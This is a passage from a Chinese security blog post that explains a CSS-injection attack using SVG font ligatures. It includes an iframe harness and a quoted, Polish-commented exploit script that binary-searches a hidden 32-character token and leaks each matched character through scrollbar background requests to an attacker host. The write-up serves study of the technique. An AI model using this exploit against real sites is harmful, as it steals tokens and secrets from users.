            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;j&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;k&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;l&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;m&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;n&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;o&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;p&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;q&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;r&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;s&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;t&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;u&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;v&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;w&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;x&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;y&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;z&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;{&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;|&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;}&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;~&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;0&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
            <span class=nt>&lt;glyph</span> <span class=na>unicode=</span><span class=s>&#39;&#34;7&#39;</span> <span class=na>horiz-adv-x=</span><span class=s>&#39;10000&#39;</span> <span class=na>d=</span><span class=s>&#39;M1 0z&#39;</span><span class=nt>/&gt;</span>
        <span class=nt>&lt;/font&gt;</span>
    <span class=nt>&lt;/defs&gt;</span>
<span class=nt>&lt;/svg&gt;</span>
</code></pre></div><p>也就是说这里构造了一个除了<code>"7</code>连字有一定宽度之外，其他字符都是0宽度。</p>
<p>第二个页面就是 font.html ，内容比较简单，构造一个适当宽度的 iframe 将 test.html 引入即可。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=cp>&lt;!DOCTYPE html&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Document<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://127.0.0.1/test.html&#34;</span> <span class=na>frameborder</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;width:500px&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><p>至于 width 为 500 px，是<code>script</code>标签内内容长度，这个需要宽度也比较关键，因为 svg 中连字的构建也不是特比好构建，也就是如果无法构建好连字，也就无法弄出滚动条，也就无处触发我们构造的请求了。所以 iframe 的宽度并不是越宽越好&mldr; svg horiz-adv-x 的参数也不是越大就能触发&mldr;</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120012326.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120012326.png loading=lazy>
</a>
</figure></p>
<p>如果按照原作者设置的 iframe width 为 40px，svg 连字 horiz-adv-x 参数为 1000 的话，就会出现如上情况。如果各位小伙伴去自己尝试一下就会发现，有一个很明显的 lightblue 颜色的瞬间，也就是 script 标签的颜色，个人认为因为浏览器渲染的顺序问题，先把在这个场景中长度为 463px 的 script 标签首先因为<code>display:table</code>的原因，在网络请求字体之前首先被渲染了，所以会看到一条 lightblue 颜色带一闪而过，导致撑破了 iframe 设置的长度，也就产生了滚动条，随即触发了我们构造的请求，随后字体才会被浏览器进行渲染，然后将我们构造的其他字体设为 0 宽度。</p>
<p>而且还有一些问题就是缓存的问题，效果如下：</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120013522.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120013522.png loading=lazy>
</a>
</figure></p>
<p>这也是原作者在原文提到的先发送一个请求让 chrome 缓存好字体的原因，但是这个方法及其不稳定&mldr;用原作者的代码直接跑跑的结果也是五花八门，每次跑都不一样。</p>
<p>然后比较稳定的办法是，预测 script 标签内的长度，比如这里的 463px ，我们设置一个比它大的值，这样一开始的渲染就不会影响到我们的结果了，对应的连字 horiz-adv-x 我们也将其扩大到 500000 ，这样就能保证每次都可以以正确的结果造成宽度溢出然后触发我们的请求了。</p>
<p>But，这个办法需要知道大概 script 标签内大概的宽度，万一不知道呢？</p>
<p>我们可以参考 ROIS 的做法，使用 iframe 的 onload 事件，当 iframe 加载完成之后再将 iframe 宽度缩小，这样就能稳定触发了。也就是说 font.html 中 iframe 我们可以这么写：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://127.0.0.1/test.html&#34;</span> <span class=na>frameborder</span><span class=o>=</span><span class=s>&#34;0&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;width:10000px&#34;</span>  <span class=na>onload</span><span class=o>=</span><span class=s>&#34;event.target.style.width=&#39;100px&#39;&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</code></pre></div><p>一开始设置一个特别大的宽度，保证不会因为渲染顺序的原因触发我们构造的请求，待到 iframe 内字体加载完毕，再将其宽度缩小，触发我们构造的请求。</p>
<p>以下是原作者使用二分加快爆破、提前缓存避免缓存问题构造的 index.html 代码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=cp>&lt;!doctype html&gt;</span><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>utf-8</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>cookie.js</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>big</span> <span class=na>id</span><span class=o>=</span><span class=s>token</span><span class=p>&gt;&lt;/</span><span class=nt>big</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
    <span class=p>(</span><span class=kr>async</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
        <span class=kr>const</span> <span class=nx>EXPECTED_TOKEN_LENGTH</span> <span class=o>=</span> <span class=mi>32</span><span class=p>;</span>
        <span class=kr>const</span> <span class=nx>ALPHABET</span> <span class=o>=</span> <span class=s1>&#39;0123456789abcdef&#39;</span><span class=p>;</span>
        <span class=c1>// W poniższym elemencie będziemy wypisywać przeczytany token.
</span><span class=c1></span>        <span class=kr>const</span> <span class=nx>outputElement</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>);</span>
        
        <span class=c1>// W tej zmiennej przechowamy token, który udało się już
</span><span class=c1></span>        <span class=c1>// wydobyć
</span><span class=c1></span>        <span class=kd>let</span> <span class=nx>extractedToken</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
        
        <span class=c1>// W tej zmiennej przechowamy prefix do tworzenia ligatur
</span><span class=c1></span>        <span class=kd>let</span> <span class=nx>prefix</span> <span class=o>=</span> <span class=s1>&#39;&#34;&#39;</span><span class=p>;</span>
        
        <span class=c1>// Wysokopoziomowo: po prostu wyciągamy kolejny znak tokena
</span><span class=c1></span>        <span class=c1>// dopóki nie wyciągnęliśmy wszystkich znaków :) 
</span><span class=c1></span>        
        <span class=k>while</span> <span class=p>(</span><span class=nx>extractedToken</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=nx>EXPECTED_TOKEN_LENGTH</span><span class=p>)</span> <span class=p>{</span>
            <span class=kr>const</span> <span class=nx>nextTokenChar</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>getNextTokenCharacter</span><span class=p>();</span>
            <span class=nx>extractedToken</span> <span class=o>+=</span> <span class=nx>nextTokenChar</span><span class=p>;</span>
            
            <span class=c1>// Znak, który wyciągnęliśmy musi być też dodany do przedrostka
</span><span class=c1></span>            <span class=c1>// dla następnych ligatur.
</span><span class=c1></span>            <span class=nx>prefix</span> <span class=o>+=</span> <span class=nx>nextTokenChar</span><span class=p>;</span>
            
            <span class=c1>// Wypiszmy w HTML-u jaki token jak na razie wyciągnęliśmy.
</span><span class=c1></span>            <span class=nx>outputElement</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=nx>extractedToken</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=c1>// Jak dotarliśmy tutaj, to znaczy, że mamy cały token!
</span><span class=c1></span>        <span class=c1>// W ramach świętowania usuńmy wszystkie iframe&#39;y i ustawmy
</span><span class=c1></span>        <span class=c1>// pogrubienie na tokenie widocznym w HTML-u ;-)
</span><span class=c1></span>        <span class=nx>deleteAllIframes</span><span class=p>();</span>
        <span class=nx>outputElement</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>fontWeight</span> <span class=o>=</span> <span class=s1>&#39;bold&#39;</span><span class=p>;</span>
        
        <span class=c1>// Funkcja, której celem jest wydobycie następnego znaku tokena
</span><span class=c1></span>        <span class=c1>// metodą dziel i zwyciężaj.
</span><span class=c1></span>        <span class=kr>async</span> <span class=kd>function</span> <span class=nx>getNextTokenCharacter</span><span class=p>()</span> <span class=p>{</span>
            <span class=c1>// Dla celów wydajnościowych - usuńmy wszystkie istniejące elementy iframe.
</span><span class=c1></span>            <span class=nx>deleteAllIframes</span><span class=p>();</span>

            <span class=kd>let</span> <span class=nx>alphabet</span> <span class=o>=</span> <span class=nx>ALPHABET</span><span class=p>;</span>
            <span class=c1>// Wykonujemy operacje tak długo aż wydobędziemy informację
</span><span class=c1></span>            <span class=c1>// jaki jest następny znak tokena.
</span><span class=c1></span>            <span class=k>while</span> <span class=p>(</span><span class=nx>alphabet</span><span class=p>.</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
                <span class=c1>// Będziemy oczekiwać na utworzenie nowego ciasteczka - najpierw więc
</span><span class=c1></span>                <span class=c1>// usuńmy wszystkie istniejące.
</span><span class=c1></span>                <span class=nx>clearAllCookies</span><span class=p>();</span>
                
                <span class=kr>const</span> <span class=p>[</span><span class=nx>leftChars</span><span class=p>,</span> <span class=nx>rightChars</span><span class=p>]</span> <span class=o>=</span> <span class=nx>split</span><span class=p>(</span><span class=nx>alphabet</span><span class=p>);</span>
                
                <span class=c1>// Najpierw upewniamy się, że fonty dla obu zestawów ligatur
</span><span class=c1></span>                <span class=c1>// są w cache&#39;u.
</span><span class=c1></span>                <span class=kr>await</span> <span class=nx>makeSureFontsAreCached</span><span class=p>(</span><span class=nx>leftChars</span><span class=p>,</span> <span class=nx>rightChars</span><span class=p>);</span>
                
                <span class=c1>// Niestety - praktyczne testy pokazały, że wrzucenie w to miejsce
</span><span class=c1></span>                <span class=c1>// sztucznego opóźnienia znacząco zwiększa prawdopodobieństwo, że atak
</span><span class=c1></span>                <span class=c1>// po drodze się nie &#34;wysypie&#34;...
</span><span class=c1></span>                <span class=kr>await</span> <span class=nx>delay</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
                
                <span class=c1>// A potem tworzymy dwa iframe&#39;y z &#34;atakującym&#34; CSS-em
</span><span class=c1></span>                <span class=kr>await</span> <span class=nb>Promise</span><span class=p>.</span><span class=nx>all</span><span class=p>([</span><span class=nx>createAttackIframe</span><span class=p>(</span><span class=nx>leftChars</span><span class=p>),</span> <span class=nx>createAttackIframe</span><span class=p>(</span><span class=nx>rightChars</span><span class=p>)]);</span>
                
                <span class=c1>// Czekamy na znaki z połączenia zwrotnego...
</span><span class=c1></span>                <span class=kr>const</span> <span class=nx>chars</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>getCharsFromReverseConnection</span><span class=p>();</span>
                
                <span class=c1>// ... i na ich podstawie kontynuujemy &#34;dziel i zwyciężaj&#34;.
</span><span class=c1></span>                <span class=nx>alphabet</span> <span class=o>=</span> <span class=nx>chars</span><span class=p>;</span>
            <span class=p>}</span>
            <span class=c1>// Jeśli znaleźliśmy się w tym miejscu, to znaczy, że alphabet
</span><span class=c1></span>            <span class=c1>// ma jeden znak. Wniosek: ten jeden znak to kolejny znak tokena.
</span><span class=c1></span>            
            <span class=k>return</span> <span class=nx>alphabet</span><span class=p>;</span>
        <span class=p>}</span>
        
        <span class=kd>function</span> <span class=nx>clearAllCookies</span><span class=p>()</span> <span class=p>{</span>
            <span class=nb>Object</span><span class=p>.</span><span class=nx>keys</span><span class=p>(</span><span class=nx>Cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>()).</span><span class=nx>forEach</span><span class=p>(</span><span class=nx>cookie</span> <span class=p>=&gt;</span> <span class=p>{</span>
                <span class=nx>Cookies</span><span class=p>.</span><span class=nx>remove</span><span class=p>(</span><span class=nx>cookie</span><span class=p>);</span>
            <span class=p>});</span>
        <span class=p>}</span>
        
        <span class=kd>function</span> <span class=nx>deleteAllIframes</span><span class=p>()</span> <span class=p>{</span>
            <span class=nb>document</span><span class=p>.</span><span class=nx>querySelectorAll</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>).</span><span class=nx>forEach</span><span class=p>(</span><span class=nx>iframe</span> <span class=p>=&gt;</span> <span class=p>{</span>
                <span class=nx>iframe</span><span class=p>.</span><span class=nx>parentNode</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>iframe</span><span class=p>);</span>
            <span class=p>});</span>
        <span class=p>}</span>
        
        <span class=c1>// Funkcja dzieląca string na dwa stringi o tej
</span><span class=c1></span>        <span class=c1>// samej długości (lub różnej o jeden).
</span><span class=c1></span>        <span class=c1>// Np. split(&#34;abcd&#34;) == [&#34;ab&#34;, &#34;cd&#34;];
</span><span class=c1></span>        <span class=kd>function</span> <span class=nx>split</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span> <span class=p>{</span>
            <span class=kr>const</span> <span class=nx>halfLength</span> <span class=o>=</span> <span class=nb>parseInt</span><span class=p>(</span><span class=nx>s</span><span class=p>.</span><span class=nx>length</span> <span class=o>/</span> <span class=mi>2</span><span class=p>);</span>
            <span class=k>return</span> <span class=p>[</span><span class=nx>s</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>halfLength</span><span class=p>),</span> <span class=nx>s</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=nx>halfLength</span><span class=p>)];</span>
        <span class=p>}</span>
        
        <span class=c1>// Funkcja generująca losowego stringa, np.
</span><span class=c1></span>        <span class=c1>// randomValue() == &#34;rand6226966173982633&#34;
</span><span class=c1></span>        <span class=kd>function</span> <span class=nx>randomValue</span><span class=p>()</span> <span class=p>{</span>
            <span class=k>return</span> <span class=s2>&#34;rand&#34;</span> <span class=o>+</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>().</span><span class=nx>toString</span><span class=p>().</span><span class=nx>slice</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
        <span class=p>}</span>
        
        <span class=c1>// Generujemy CSS-a, który zapewni nam, że fonty znajdą się w cache.
</span><span class=c1></span>        <span class=c1>// Jako dowód na to, że font został już pobrany, użyjemy sprawdzenia
</span><span class=c1></span>        <span class=c1>// czy ciasteczko font_${losowy_ciąg_znaków} zostało zdefiniowane.
</span><span class=c1></span>        <span class=kd>function</span> <span class=nx>makeSureFontsAreCached</span><span class=p>(</span><span class=nx>leftChars</span><span class=p>,</span> <span class=nx>rightChars</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
                <span class=c1>// Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u.
</span><span class=c1></span>                <span class=kd>let</span> <span class=nx>encodedPrefix</span><span class=p>;</span>
                <span class=p>[</span><span class=nx>encodedPrefix</span><span class=p>,</span> <span class=nx>leftChars</span><span class=p>,</span> <span class=nx>rightChars</span><span class=p>]</span> <span class=o>=</span> <span class=p>[</span><span class=nx>prefix</span><span class=p>,</span> <span class=nx>leftChars</span><span class=p>,</span> <span class=nx>rightChars</span><span class=p>].</span><span class=nx>map</span><span class=p>(</span><span class=nx>val</span> <span class=p>=&gt;</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>val</span><span class=p>));</span>
            
                <span class=c1>// Generujemy CSS-a odwołującego się do obu fontów. Używamy body:before i body:after
</span><span class=c1></span>                <span class=c1>// by upewnić się, że przeglądarka będzie musiała oba fonty pobrać.
</span><span class=c1></span>                <span class=kr>const</span> <span class=nx>css</span> <span class=o>=</span> <span class=sb>`
</span><span class=sb>                    @font-face {
</span><span class=sb>                        font-family: &#39;hack1&#39;;
</span><span class=sb>                        src: url(http://192.168.13.37:3001/font/</span><span class=si>${</span><span class=nx>encodedPrefix</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>leftChars</span><span class=si>}</span><span class=sb>)
</span><span class=sb>                    }
</span><span class=sb>                    @font-face {
</span><span class=sb>                        font-family: &#39;hack2&#39;;
</span><span class=sb>                        src: url(http://192.168.13.37:3001/font/</span><span class=si>${</span><span class=nx>encodedPrefix</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>rightChars</span><span class=si>}</span><span class=sb>)
</span><span class=sb>                    }
</span><span class=sb>                    body:before {
</span><span class=sb>                        content: &#39;x&#39;;
</span><span class=sb>                        font-family: &#39;hack1&#39;;
</span><span class=sb>                    }
</span><span class=sb>                    body:after {
</span><span class=sb>                        content: &#39;x&#39;;
</span><span class=sb>                        font-family: &#39;hack2&#39;;
</span><span class=sb>                    }
</span><span class=sb>                `</span><span class=p>;</span>
                
                <span class=c1>// Tworzymy iframe, w którym załadowane zostaną fonty
</span><span class=c1></span>                <span class=kr>const</span> <span class=nx>iframe</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>
                <span class=nx>iframe</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
                    <span class=c1>// Funkcja zakończy swoje działanie dopiero gdy zostanie wyzwolone zdarzenie
</span><span class=c1></span>                    <span class=c1>// onload w elemencie iframe
</span><span class=c1></span>                    <span class=nx>resolve</span><span class=p>();</span>
                <span class=p>}</span>
                <span class=nx>iframe</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s1>&#39;http://localhost:12345/?css=&#39;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>css</span><span class=p>);</span>
                <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>iframe</span><span class=p>);</span>
            <span class=p>})</span>
        <span class=p>}</span>
        
        <span class=c1>// Jak wywołana zostaje ta funkcja, to już mamy pewność, że fonty
</span><span class=c1></span>        <span class=c1>// są w cache&#39;u. Spróbujmy więc zaatakować z takim stylem, w wyniku
</span><span class=c1></span>        <span class=c1>// którego pojawi się pasek przewijania, jeśli trafiliśmy ze znakami
</span><span class=c1></span>        <span class=c1>// w tokenie.
</span><span class=c1></span>        <span class=kd>function</span> <span class=nx>createAttackIframe</span><span class=p>(</span><span class=nx>chars</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
                <span class=c1>// Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u.
</span><span class=c1></span>                <span class=kd>let</span> <span class=nx>encodedPrefix</span><span class=p>;</span>
                <span class=p>[</span><span class=nx>encodedPrefix</span><span class=p>,</span> <span class=nx>chars</span><span class=p>]</span> <span class=o>=</span> <span class=p>[</span><span class=nx>prefix</span><span class=p>,</span> <span class=nx>chars</span><span class=p>].</span><span class=nx>map</span><span class=p>(</span><span class=nx>val</span> <span class=p>=&gt;</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>val</span><span class=p>));</span>
            
                <span class=kr>const</span> <span class=nx>css</span> <span class=o>=</span> <span class=sb>`
</span><span class=sb>                @font-face {
</span><span class=sb>                    font-family: &#34;hack&#34;;
</span><span class=sb>                    src: url(http://192.168.13.37:3001/font/</span><span class=si>${</span><span class=nx>encodedPrefix</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>chars</span><span class=si>}</span><span class=sb>)
</span><span class=sb>                }
</span><span class=sb>                script {
</span><span class=sb>                    display: table;
</span><span class=sb>                    font-family: &#34;hack&#34;;
</span><span class=sb>                    white-space: nowrap;
</span><span class=sb>                }
</span><span class=sb>                body::-webkit-scrollbar {
</span><span class=sb>                    background: blue;
</span><span class=sb>                }
</span><span class=sb>                body::-webkit-scrollbar:horizontal {
</span><span class=sb>                    background: blue url(http://192.168.13.37:3001/reverse/</span><span class=si>${</span><span class=nx>chars</span><span class=si>}</span><span class=sb>);
</span><span class=sb>                }
</span><span class=sb>                `</span><span class=p>;</span>
            
                <span class=kr>const</span> <span class=nx>iframe</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>
                <span class=nx>iframe</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
                    <span class=nx>resolve</span><span class=p>();</span>
                <span class=p>}</span>
                <span class=nx>iframe</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s1>&#39;http://localhost:12345/?css=&#39;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>css</span><span class=p>);</span>
                <span class=c1>// Ten iframe musi być stosunkowo wąski - by pojawił się pasek przewijania.
</span><span class=c1></span>                <span class=nx>iframe</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>width</span> <span class=o>=</span> <span class=s2>&#34;40px&#34;</span><span class=p>;</span>
                <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>iframe</span><span class=p>);</span>
            <span class=p>})</span>   
        <span class=p>}</span>
        
        <span class=c1>// Sprawdzamy co 20ms czy dostaliśmy połączenie zwrotne wygenerowane
</span><span class=c1></span>        <span class=c1>// przez pasek przewijania. Jeśli tak - to zwracamy wartość z ciasteczka chars.
</span><span class=c1></span>        <span class=kd>function</span> <span class=nx>getCharsFromReverseConnection</span><span class=p>()</span> <span class=p>{</span>
            <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
                <span class=kr>const</span> <span class=nx>interval</span> <span class=o>=</span> <span class=nx>setInterval</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
                    <span class=kr>const</span> <span class=nx>chars</span> <span class=o>=</span> <span class=nx>Cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;chars&#39;</span><span class=p>);</span>
                    <span class=k>if</span> <span class=p>(</span><span class=nx>chars</span><span class=p>)</span> <span class=p>{</span>
                        <span class=nx>clearInterval</span><span class=p>(</span><span class=nx>interval</span><span class=p>);</span>
                        <span class=nx>resolve</span><span class=p>(</span><span class=nx>chars</span><span class=p>);</span>
                    <span class=p>}</span>
                <span class=p>},</span> <span class=mi>20</span><span class=p>);</span>
            <span class=p>})</span>
        <span class=p>}</span>
        
        <span class=kr>async</span> <span class=kd>function</span> <span class=nx>delay</span><span class=p>(</span><span class=nx>time</span><span class=p>)</span> <span class=p>{</span>
            <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
                <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>time</span><span class=p>);</span>
